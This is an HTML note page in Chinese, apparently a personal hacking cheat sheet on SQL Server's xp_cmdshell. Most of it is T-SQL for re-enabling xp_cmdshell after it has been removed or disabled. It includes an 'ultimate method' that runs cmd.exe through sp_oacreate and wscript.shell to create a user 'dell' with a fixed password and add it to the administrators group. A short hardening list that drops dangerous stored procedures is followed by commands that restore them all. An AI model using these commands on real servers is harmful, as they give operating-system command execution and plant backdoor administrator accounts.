<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>cmdshell</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>cmdshell</h1><br/>查看版本<br />select @@version<br /><br /><br />运行cmd					<br />exec xp_cmdshell &#39;dir&#39;			<br />exec master.dbo.xp_cmdshell &#39;dir&#39;	<br /><br /><br />恢复xp_cmdshell:<br />sp_configure &#39;show advanced options&#39;,1;reconfigure;sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;<br />go<br /><br />//第二个1改成0,关闭<br /><br /><br />突破SA的各种困难 <br />常见情况恢复执行xp_cmdshell <br />1 未能找到存储过程&#39;master..xpcmdshell&#39;. <br />恢复方法：查询分离器连接后, <br />第一步执行:EXEC sp_addextendedproc xp_cmdshell,@dllname =&#39;xplog70.dll&#39;declare @o int <br />第二步执行:sp_addextendedproc &#39;xp_cmdshell&#39;, &#39;xpsql70.dll&#39; <br />然后按F5键命令执行完毕 <br /><br />2 无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。） <br />恢复方法：查询分离器连接后, <br />第一步执行：sp_dropextendedproc &quot;xp_cmdshell&quot; <br />第二步执行：sp_addextendedproc &#39;xp_cmdshell&#39;, &#39;xpsql70.dll&#39; <br />然后按F5键命令执行完毕 <br /><br />3 无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。) <br />恢复方法：查询分离器连接后, <br />第一步执行:exec sp_dropextendedproc &#39;xp_cmdshell&#39; <br />第二步执行:exec sp_addextendedproc &#39;xp_cmdshell&#39;,&#39;xpweb70.dll&#39; <br />然后按F5键命令执行完毕 <br /><br /><br />四.终极方法. <br />如果以上方法均不可恢复,请尝试用下面的办法直接添加帐户: <br />查询分离器连接后, <br />2000servser系统: <br />declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\winnt\system32\cmd.exe /c net user dell huxifeng007 /add&#39; <br />declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\winnt\system32\cmd.exe /c net localgroup administrators dell /add&#39; <br /><br />xp或2003server系统: <br />declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net user dell huxifeng007 /add&#39; <br />declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net localgroup administrators dell /add&#39; <br /><br />-------------- <br />xp_cmdshell新的恢复办法 <br />删除 <br />drop procedure sp_addextendedproc <br />drop procedure sp_oacreate <br />exec sp_dropextendedproc &#39;xp_cmdshell&#39; <br /><br />恢复 <br />dbcc addextendedproc (&quot;sp_oacreate&quot;,&quot;odsole70.dll&quot;) <br />dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;) <br /><br />这样可以直接恢复，不用去管sp_addextendedproc是不是存在 <br />----------------------------- <br />删除扩展存储过过程xp_cmdshell的语句: <br />exec sp_dropextendedproc &#39;xp_cmdshell&#39; <br /><br />恢复cmdshell的sql语句 <br />exec sp_addextendedproc xp_cmdshell ,@dllname =&#39;xplog70.dll&#39; <br /><br />开启cmdshell的sql语句 <br />exec sp_addextendedproc xp_cmdshell ,@dllname =&#39;xplog70.dll&#39; <br /><br />判断存储扩展是否存在 <br />select count(*) from master.dbo.sysobjects where xtype=&#39;x&#39; and name=&#39;xp_cmdshell&#39; <br />返回结果为1就ok <br />恢复xp_cmdshell <br />exec master.dbo.addextendedproc &#39;xp_cmdshell&#39;,&#39;xplog70.dll&#39;;select count(*) from master.dbo.sysobjects where xtype=&#39;x&#39; and name=&#39;xp_cmdshell&#39; <br />返回结果为1就ok <br />否则上传xplog7.0.dll <br />exec master.dbo.addextendedproc &#39;xp_cmdshell&#39;,&#39;c:\winnt\system32\xplog70.dll&#39; <br /><br />堵上cmdshell的sql语句 <br />sp_dropextendedproc &quot;xp_cmdshell <br />---------------- <br />删除sql危险存储： <br />复制代码 代码如下:<br /><br />DROP PROCEDURE sp_makewebtask <br />exec master..sp_dropextendedproc xp_cmdshell <br />exec master..sp_dropextendedproc xp_dirtree <br />exec master..sp_dropextendedproc xp_fileexist <br />exec master..sp_dropextendedproc xp_terminate_process <br />exec master..sp_dropextendedproc sp_oamethod <br />exec master..sp_dropextendedproc sp_oacreate <br />exec master..sp_dropextendedproc xp_regaddmultistring <br />exec master..sp_dropextendedproc xp_regdeletekey <br />exec master..sp_dropextendedproc xp_regdeletevalue <br />exec master..sp_dropextendedproc xp_regenumkeys <br />exec master..sp_dropextendedproc xp_regenumvalues <br />exec master..sp_dropextendedproc sp_add_job <br />exec master..sp_dropextendedproc sp_addtask <br />exec master..sp_dropextendedproc xp_regread <br />exec master..sp_dropextendedproc xp_regwrite <br />exec master..sp_dropextendedproc xp_readwebtask <br />exec master..sp_dropextendedproc xp_makewebtask <br />exec master..sp_dropextendedproc xp_regremovemultistring <br />exec master..sp_dropextendedproc sp_OACreate <br />DROP PROCEDURE sp_addextendedproc <br /><br />/*不狐 附上恢复扩展存储过程的办法 <br /><br />先恢复sp_addextendedproc，语句如下： <br />SQL代码： <br />复制代码 代码如下:<br /><br />create procedure sp_addextendedproc --- 1996/08/30 20:13 <br />@functname nvarchar(517),/* (owner.)name of function to call */ @dllname varchar(255)/* name of DLL containing function */ as <br />set implicit_transactions off <br />if @@trancount &gt; 0 <br />begin <br />raiserror(15002,-1,-1,&#39;sp_addextendedproc&#39;) <br />return (1) <br />end <br />dbcc addextendedproc( @functname, @dllname) <br />return (0) -- sp_addextendedproc <br />GO <br /><br />再恢复以上所有扩展存储过程 <br />SQL代码： <br />复制代码 代码如下:<br /><br />use master <br />exec sp_addextendedproc xp_cmdshell,&#39;xp_cmdshell.dll&#39; <br />exec sp_addextendedproc xp_dirtree,&#39;xpstar.dll&#39; <br />exec sp_addextendedproc xp_enumgroups,&#39;xplog70.dll&#39; <br />exec sp_addextendedproc xp_fixeddrives,&#39;xpstar.dll&#39; <br />exec sp_addextendedproc xp_loginconfig,&#39;xplog70.dll&#39; <br />exec sp_addextendedproc xp_enumerrorlogs,&#39;xpstar.dll&#39; <br />exec sp_addextendedproc xp_getfiledetails,&#39;xpstar.dll&#39; <br />exec sp_addextendedproc sp_OACreate,&#39;odsole70.dll&#39; <br />exec sp_addextendedproc sp_OADestroy,&#39;odsole70.dll&#39; <br />exec sp_addextendedproc sp_OAGetErrorInfo,&#39;odsole70.dll&#39; <br />exec sp_addextendedproc sp_OAGetProperty,&#39;odsole70.dll&#39; <br />exec sp_addextendedproc sp_OAMethod,&#39;odsole70.dll&#39; <br />exec sp_addextendedproc sp_OASetProperty,&#39;odsole70.dll&#39; <br />exec sp_addextendedproc sp_OAStop,&#39;odsole70.dll&#39; <br />exec sp_addextendedproc xp_regaddmultistring,&#39;xpstar.dll&#39; <br />exec sp_addextendedproc xp_regdeletekey,&#39;xpstar.dll&#39; <br />exec sp_addextendedproc xp_regdeletevalue,&#39;xpstar.dll&#39; <br />exec sp_addextendedproc xp_regenumvalues,&#39;xpstar.dll&#39; <br />exec sp_addextendedproc xp_regread,&#39;xpstar.dll&#39; <br />exec sp_addextendedproc xp_regremovemultistring,&#39;xpstar.dll&#39; <br />exec sp_addextendedproc xp_regwrite,&#39;xpstar.dll&#39; <br />exec sp_addextendedproc xp_availablemedia,&#39;xpstar.dll&#39; <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><a href="http://www.jb51.net/article/24449.htm">http://www.jb51.net/article/24449.htm</a><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>